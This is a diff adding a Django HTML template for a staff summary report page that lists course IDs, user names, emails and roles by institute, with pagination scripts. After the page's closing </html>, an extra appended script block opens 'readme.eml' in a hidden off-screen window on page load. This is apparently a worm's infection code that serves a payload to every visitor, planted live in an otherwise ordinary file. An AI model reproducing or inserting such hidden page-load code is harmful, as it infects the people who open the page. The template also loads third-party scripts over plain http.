@@ -1,0 +1,271 @@
+{% load staticfiles %}	
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Program Manager Reports</title>
+
+    <link rel="stylesheet" type="text/css" href="{% static 'bootstrap/css/bootstrap.min.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'font-awesome/css/font-awesome.min.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/local.css' %}">
+
+
+    <script type="text/javascript" src="{% static 'js/jquery-1.10.2.min.js' %}"></script>
+    <script type="text/javascript" src="{% static 'bootstrap/js/bootstrap.min.js' %}"></script>
+
+    <!-- you need to include the shieldui css and js assets in order for the charts to work -->
+    <link rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/shieldui-all.min.css">
+    <link rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/light-bootstrap/all.min.css">
+    <link id="gridcss" rel="stylesheet" type="text/css" href="http://www.shieldui.com/shared/components/latest/css/dark-bootstrap/all.min.css">
+
+    <script type="text/javascript" src="http://www.shieldui.com/shared/components/latest/js/shieldui-all.min.js"></script>
+    <script type="text/javascript" src="http://www.prepbootstrap.com/Content/js/gridData.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+    <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.13.0.css">
+</head>
+<body>
+
+    <div id="wrapper" >
+
+          <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <div class="navbar-header">
+                
+                <a class="navbar-brand" href="{% url 'index' %}">Program Manager Panel</a>
+            </div>
+
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
+               <ul id="active" class="nav navbar-nav side-nav">
+                    <li class="selected"><a href="{% url  'index' %}"><i class="fa fa-globe"></i> Summary</a></li>
+                    <li ><a href="{% url 'crsofinsti' orgid='IITBombayX' %}"><i class="fa fa-tasks"></i> Institutewise Enrollments </a></li>
+		                                       <li ><a href="{% url 'coursewise' %}?InstituteId=IITBombayX"><i class="fa fa-tasks"></i>Institutewise Cerificates </a></li> 
+		                        <li ><a href="{% url 'fac_first' %}"><i class="fa fa-tasks"></i> Staff Summary </a></li>
+                     
+                </ul>
+
+                <ul class="nav navbar-nav navbar-right navbar-user">
+                    <li class="divider-vertical"></li>
+                </ul>
+            </div>
+        </nav>
+
+        <div id="page-wrapper">
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <h2>Institutewise&nbsp<small>Staff summary</small></h2>
+                       </div>
+            </div>
+<!---        table actions         --->
+
+ <div class="row">
+                <div class="col-lg-12">
+                <!---  search box div -->
+<div class="form-group">
+                                    <select class="form-control" id="institute_selection" name="institute_selection" style="width:150px;position:absolute;left:20px;top:15px;" >
+                                        {% if institute == selected_institute %}
+                                        <option value="all" selected='selected' onclick="select_institute(this.value);" >Select Institute</option>
+                                        {% endif %}
+                                        {% if institute != selected_institute %}
+                                        <option value="all" onclick="select_institute(this.value);" >Select Institute</option>
+                                        {% endif %}
+                                        {% for institute in institutes %}
+                                        {% if institute == selected_institute %}
+                                        <option value="{{institute}}" selected='selected' onclick="select_institute(this.value);">{{institute}}</option>
+                                        {% endif %}
+                                        {% if institute != selected_institute %}
+                                        <option value="{{institute}}" onclick="select_institute(this.value);">{{institute}}</option>
+                                        {% endif %}
+                                        {% endfor %}
+                                    </select>
+                                    <select class="form-control" id="course_id_selection" name="course_id_selection" style="width:200px;position:absolute;left:190px;top:15px;" >
+                                        {% if course == selected_course %}
+                                        <option value="all" selected='selected' onclick="select_course(this.value);" >Select Course</option>
+                                        {% endif %}
+                                        {% if course != selected_course %}
+                                        <option value="all" onclick="select_course(this.value);" >Select Course</option>
+                                        {% endif %}
+                                        {% for course in courses %}
+                                        {% if course == selected_course %}
+                                        <option value="{{course}}" selected='selected' onclick="select_course(this.value);">{{course}}</option>
+                                        {% endif %}
+                                        {% if course != selected_course %}
+                                        <option value="{{course}}" onclick="select_course(this.value);">{{course}}</option>
+                                        {% endif %}
+                                        {% endfor %}
+                                    </select>
+</div>
+                <!--- search box div  --> 
+                		<button id="gotobutton" type="button" class="btn btn-primary btn-md"  style="width:40px;position:absolute;left:750px;" onclick="prev();return false">Prev</button>
+                		<button id="gotobutton" type="button" class="btn btn-primary btn-md"  style="width:40px;position:absolute;left:800px;" onclick="next();return false">Next</button>
+				<div style="width:20%;float:right">
+  		 			<form class="form-inline " role="form">
+	 				<div class="form-group" style="float:right">
+ 	     					<input class="form-control input-md" style="width:80px;"  id="focusedInput2" type="number">
+ 	    					<button id="gotobutton" type="button" class="btn btn-primary btn-md"  style="width:40px;" onclick="goto();return false">Goto</button>
+	   				</div>
+ 				</div>
+ 				<div class="row form-inline"style="float:right;font-size:80%">
+					<div class="btn-group" style="font-size:80%;position:absolute;left:400px;">
+	  				<button class="btn btn-md btn-primary dropdown-toggle" id="entries" data-toggle="dropdown">Entries<span class="caret"></span></button>
+	  				<ul class="dropdown-menu" id="entries">
+	    					<li><a href="#" id="action-10" onclick="entries(10);return false">10</a></li>
+	    					<li><a href="#" id="action-20" onclick="entries(20);return false">20</a></li>
+	    					<li><a href="#" id="action-50" onclick="entries(50);return false">50</a></li>
+	   					<li><a href="#" id="action-100" onclick="entries(100);return false">100</a></li>
+	    					<li><a href="#" id="action-150" onclick="entries(150);return false">150</a></li>
+	    					<li><a href="#" id="action-200" onclick="entries(200);return false">200</a></li>
+	  				</ul>
+					</div>
+					&nbsp;&nbsp;
+<label style="font-size:150%;top:22px;position:absolute;left:485px;">Per Page</label>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<label style="font-size:150%;top:22px;position:absolute;left:560px;" id="rows_per_page2">{{per_page}},&nbsp;&nbsp;&nbsp;Page&nbsp;&nbsp;{{page_no}}&nbsp;&nbsp;of&nbsp;&nbsp;{{page_count}}</label>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+				</div>
+                </div>
+
+ </div><br>
+<!---         table actions              --->
+            <div class="row">
+
+                <div class="col-md-12" >
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-bar-chart-o"></i> Institutewise Staff Details</h3>
+                        </div>
+                        <div class="panel-body" style="	height:430px;overflow-x:hidden;overflow-y:scroll;">
+                            <div id="certi_count">
+  <!---------------------------------------------------------------------------------------------------------->
+			<!--------table division --------->
+			<div class="sui-grid sui-grid-core"  id="shieldui-grid1" >
+			<div class="sui-gridcontent" style="width:1000px;overflow-x:hidden;overflow-y:scroll;position:relative;">
+				<table class="sui-table" border=1 ><colgroup><col><col><col><col></colgroup>
+					<thead style="font-size:120%">
+						<tr class="sui-columnheader">
+						<th class="sui-headercell" style="width:80px;">S.No.</th>
+						<th class="sui-headercell" style="width:320px;">Course ID</th>
+						<th class="sui-headercell" style="width:150px;" >User Name</th>
+						<th class="sui-headercell" style="width:250px;" >Email</th>
+						<th class="sui-headercell" >Role</th>
+						</tr>
+					</thead>
+				<tbody style="font-size:110%">
+				{% for i in data %}
+					{% if forloop.counter|divisibleby:2 %}
+						<tr class="sui-row"><td class="sui-cell">&nbsp;&nbsp;&nbsp;{{i.4}}</td><td class="sui-cell">{{ i.2 }}</td><td class="sui-cell">{{ i.0 }}</td><td class="sui-cell">{{ i.1 }}</td><td class="sui-cell">{{ i.3 }}</td></tr>
+					{% else %}
+						<tr class="sui-alt-row"><td class="sui-cell">&nbsp;&nbsp;&nbsp;{{i.4}}</td><td class="sui-cell">{{ i.2 }}</td><td class="sui-cell">{{ i.0 }}</td><td class="sui-cell">{{ i.1 }}</td><td class="sui-cell">{{ i.3 }}</td></tr>
+					{% endif %}
+				{% endfor %}
+				</tbody>
+				
+				</table>
+			</div>          
+			</div>
+                       <!------------------------------table division------------------------------------->
+                            
+                            
+                            
+  <!---------------------------------------------------panel body------------------------------------------------------->                   
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+                  
+
+                
+            </div>
+            <div class="row">
+          
+</body>
+<script>
+function select_institute(institute)
+	{
+	course_id='all';
+	data=[institute,course_id,1,10];
+	window.location="{% url 'fac_second' %}?data="+data;
+	}
+function select_course(course_id)
+	{
+	var a=document.getElementById('institute_selection');
+	var institute=a.options[a.selectedIndex].value;
+	data=[institute,course_id,1,10];
+	window.location="{% url 'fac_second' %}?data="+data;
+	}
+function entries(no_of_records)
+	{
+	var a=document.getElementById('institute_selection');
+	var institute=a.options[a.selectedIndex].value;
+	var b=document.getElementById('course_id_selection');
+	var course_id=b.options[b.selectedIndex].value;
+	data=[institute,course_id,1,no_of_records];
+	//alert(data);
+	window.location="{% url 'fac_second' %}?data="+data;
+	}
+function goto()
+	{
+	page_no=document.getElementById("focusedInput2").value;
+	page_count={{page_count}}
+	if(page_no >0 && page_no<=page_count)
+	{
+	per_page={{per_page}};
+	var a=document.getElementById('institute_selection');
+	var institute=a.options[a.selectedIndex].value;
+	var b=document.getElementById('course_id_selection');
+	var course_id=b.options[b.selectedIndex].value;
+	data=[institute,course_id,page_no,per_page];
+	//alert(data);
+	window.location="{% url 'fac_second' %}?data="+data;
+	}
+	else
+		{
+		alert('Invalid Page Number')
+		}
+	}
+function prev()
+	{
+	page_no=document.getElementById("focusedInput2").value;
+	per_page={{per_page}};
+	page_no={{page_no}}-1;
+	if(page_no>0)
+	{
+	var a=document.getElementById('institute_selection');
+	var institute=a.options[a.selectedIndex].value;
+	var b=document.getElementById('course_id_selection');
+	var course_id=b.options[b.selectedIndex].value;
+	data=[institute,course_id,page_no,per_page];
+	//alert(data);
+	window.location="{% url 'fac_second' %}?data="+data;
+	}
+	else
+		{
+		alert('Invalid Option');
+		}
+	}
+function next()
+	{
+	page_no=document.getElementById("focusedInput2").value;
+	per_page={{per_page}};
+	page_count={{page_count}}
+	page_no={{page_no}}+1;
+	if(page_no<=page_count)
+	{
+	var a=document.getElementById('institute_selection');
+	var institute=a.options[a.selectedIndex].value;
+	var b=document.getElementById('course_id_selection');
+	var course_id=b.options[b.selectedIndex].value;
+	data=[institute,course_id,page_no,per_page];
+	//alert(data);
+	window.location="{% url 'fac_second' %}?data="+data;
+	}
+	else
+		{
+		alert('invalid Option');
+		}
+	}
+</script>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
